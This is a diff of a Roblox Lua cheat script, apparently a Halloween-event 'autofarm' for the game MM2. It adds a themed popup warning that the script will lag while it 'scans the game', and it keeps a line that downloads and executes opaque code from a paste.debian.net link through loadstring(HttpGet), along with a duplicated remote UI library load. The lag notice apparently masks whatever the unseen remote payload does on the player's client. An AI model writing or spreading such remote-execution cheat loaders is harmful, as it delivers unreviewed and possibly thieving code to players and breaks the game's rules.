@@ -1,5 +1,137 @@
- loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
+--[[
+    
+    ███╗   ███╗███╗   ███╗██████╗ 
+    ████╗ ████║████╗ ████║╚════██╗
+    ██╔████╔██║██╔████╔██║ █████╔╝
+    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
+    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
+    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
+    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
+    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
+    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
+    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
+    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
+    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
+    
+    🎃 AUT0FARM HALLOWEEN EVENT 2025 🎃
+    ]]
+local function createLagNotification()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    
+    -- Main notification frame
+    local notification = Instance.new("Frame")
+    notification.ZIndex = 999999
+    notification.Size = UDim2.new(0, 350, 0, 120)
+    notification.Position = UDim2.new(0.5, -175, 0, 20)
+    notification.AnchorPoint = Vector2.new(0.5, 0)
+    notification.BackgroundColor3 = Color3.fromRGB(13, 7, 0) -- Dark brown
+    notification.BorderSizePixel = 0
+    notification.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = notification
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.ZIndex = 999999
+    stroke.Color = Color3.fromRGB(255, 117, 24) -- Orange
+    stroke.Thickness = 3
+    stroke.Parent = notification
+    
+    -- Pumpkin icon
+    local pumpkin = Instance.new("TextLabel")
+    pumpkin.ZIndex = 999999
+    pumpkin.Size = UDim2.new(0, 40, 0, 40)
+    pumpkin.Position = UDim2.new(0, 15, 0, 15)
+    pumpkin.BackgroundTransparency = 1
+    pumpkin.Text = "🎃"
+    pumpkin.TextColor3 = Color3.fromRGB(255, 117, 24)
+    pumpkin.TextScaled = true
+    pumpkin.Font = Enum.Font.GothamBold
+    pumpkin.Parent = notification
+    
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.ZIndex = 999999
+    title.Size = UDim2.new(0, 250, 0, 30)
+    title.Position = UDim2.new(0, 65, 0, 15)
+    title.BackgroundTransparency = 1
+    title.Text = "SPOOKY LAG WARNING!"
+    title.TextColor3 = Color3.fromRGB(255, 117, 24)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = notification
+    
+    -- Message
+    local message = Instance.new("TextLabel")
+    message.ZIndex = 999999
+    message.Size = UDim2.new(1, -30, 0, 50)
+    message.Position = UDim2.new(0, 15, 0, 55)
+    message.BackgroundTransparency = 1
+    message.Text = "This autofarm may cause temporary lag for the first few minutes as it loads and scans the game."
+    message.TextColor3 = Color3.fromRGB(255, 255, 255)
+    message.TextScaled = true
+    message.Font = Enum.Font.Gotham
+    message.TextWrapped = true
+    message.Parent = notification
+    
+    -- Floating ghost effect
+    local ghost = Instance.new("TextLabel")
+    ghost.ZIndex = 999999
+    ghost.Size = UDim2.new(0, 30, 0, 30)
+    ghost.Position = UDim2.new(0, -40, 0, 60)
+    ghost.BackgroundTransparency = 1
+    ghost.Text = "👻"
+    ghost.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ghost.TextScaled = true
+    ghost.Font = Enum.Font.GothamBold
+    ghost.Parent = notification
+    
+    -- Pulsing glow effect
+    local pulseConnection
+    pulseConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        local pulse = math.sin(tick() * 5) * 0.3 + 0.7
+        stroke.Transparency = 1 - pulse
+        pumpkin.TextColor3 = Color3.fromRGB(255 * pulse, 117 * pulse, 24 * pulse)
+    end)
+    
+    -- Ghost floating animation
+    local ghostTween = game:GetService("TweenService"):Create(ghost, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+        Position = UDim2.new(1, 10, 0, 60)
+    })
+    ghostTween:Play()
+    
+    -- Auto-remove after 10 seconds
+    task.delay(10, function()
+        pulseConnection:Disconnect()
+        -- Fade out animation
+        local fadeTween = game:GetService("TweenService"):Create(notification, TweenInfo.new(1), {
+            BackgroundTransparency = 1,
+            Position = UDim2.new(0.5, -175, 0, -150)
+        })
+        fadeTween:Play()
+        fadeTween.Completed:Wait()
+        screenGui:Destroy()
+    end)
+    
+    -- Spooky sound effect
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://5869944292" -- Halloween whoosh sound
+    sound.Volume = 0.3
+    sound.Parent = notification
+    sound:Play()
+end
+
+createLagNotification()
+
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
 wait(0.5)
+
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 
 WindUI:AddTheme({
